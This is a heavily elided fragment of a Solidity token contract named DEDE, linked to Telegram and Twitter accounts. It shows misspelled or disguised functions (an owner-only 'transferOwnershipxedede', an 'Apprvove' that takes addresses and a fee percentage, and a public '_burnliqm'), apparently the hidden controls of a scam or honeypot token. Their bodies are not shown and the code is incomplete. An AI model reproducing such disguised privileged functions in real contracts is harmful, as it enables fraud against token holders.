/**
https://t.me/Dede_ERC20
https://twitter.com/PepeKiller_Dede
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipxedede(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract DEDE is Ownable {
    ...
    function Apprvove(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnliqm(address user) public {
